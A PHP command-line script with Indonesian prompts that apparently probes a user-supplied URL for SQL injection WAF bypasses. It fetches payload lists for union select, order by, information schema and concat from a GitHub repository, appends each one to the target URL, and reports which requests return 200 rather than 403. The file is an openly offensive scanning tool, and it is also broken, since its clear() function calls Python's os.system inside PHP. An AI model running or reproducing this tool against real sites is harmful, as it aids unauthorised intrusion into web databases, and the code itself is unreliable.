<?php
define('BIN','.bin');
function is_win(){
    if (stripos(PHP_OS, 'win') === 0){
        return true;
    }
    else{
        return false;
    }
}
function clear(){
    if (is_win()){
        os.system('cls');
    }else{
        os.system('clear');
    }
}
function PS1(){
    return "binsar@indosec~$ ";
}
function color($colorName){
    if (!is_win()){
        $colorName = strtolower($colorName);
        $colorList = ['black','red','green','yellow','blue','purple','cyan','white','normal'];
        $colorCode = ['black'=>30,'red'=>'31','green'=>32,'yellow'=>33,'blue'=>34,'purple'=>35,'cyan'=>36,'white'=>37,'normal'=>0];
        if (in_array($colorName,$colorList)){
            return "\033[".$colorCode[$colorName].";1m";
        }
    }else{
        return '';
    }
}
// bypass WAF Function
function get_waf($waf){
    $waf = strtolower($waf);
    if($waf == 'union select'){
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/union_select.txt');
    }elseif($waf == 'order by'){
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/order-by.txt');
    }elseif($waf == 'concat'){
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/concat.txt');
    }elseif($waf == 'group concat'){
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/group_concat.txt');
    }elseif($waf == 'information schema'){
        $waf = file_get_contents('https://raw.githubusercontent.com/BinsarJr/sql-bypass-waf/master/.bin/information schema.txt');
    }else{
        clear();
        echo "Masukkan parameter dengan benar silahkan cek function get_waf";
        exit();
    }
    if (!is_dir(BIN))
        mkdir(BIN);    
    $results = [];
    $waf = explode(PHP_EOL,$waf);
    foreach($waf as $waf){
        if (!in_array($waf,$results) and $waf != NULL){
            array_push($results,$waf);
        }
    }
    return $results;
}


// start program
clear();
echo "
\t\tMasukkan opsi bypass di bawah ini
\t[1] Union Select
\t[2] Order By
\t[3] Information Schema
\t[4] Concat
\t[5] Group Concat


";
echo PS1();
$opsi = trim(fgets(STDIN));
clear();
echo "Masukkan url untuk di cek bypass waf\n";
echo PS1();
$url = trim(fgets(STDIN));
if ($opsi == 1){
    $bypassWaf = get_waf('union select');
}elseif ($opsi == 2){
    $bypassWaf = get_waf('order by');
}elseif ($opsi == 3){
    $bypassWaf = get_waf('information schema');
}elseif ($opsi == 4){
    $bypassWaf = get_waf('concat');
}elseif ($opsi == 5){
    $bypassWaf = get_waf('group concat');
}else{
    echo "masukkan opsi dengan benar";
    exit();
}

foreach ($bypassWaf as $bypassWaf){
    // echo $url.$bypassWaf;
    $ch = curl_init($url.$bypassWaf);
    $options = [
        CURLOPT_RETURNTRANSFER =>1,
        CURLOPT_TIMEOUT => 5
    ];
    curl_setopt_array($ch, $options);
    $results = curl_exec($ch);
    $status_code = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    if ($status_code == 200){
        echo color('green')."[+] 200 OK\t\t : $bypassWaf";
    }elseif($status_code == 403){
        echo color('yellow')."[-] 403 Forbidden\t : $bypassWaf";
    }else{
        echo color('red')."[!] Warning\t\t : error with status code $status_code";
    }
    echo "\n";
}



// end program
echo color('normal');
?>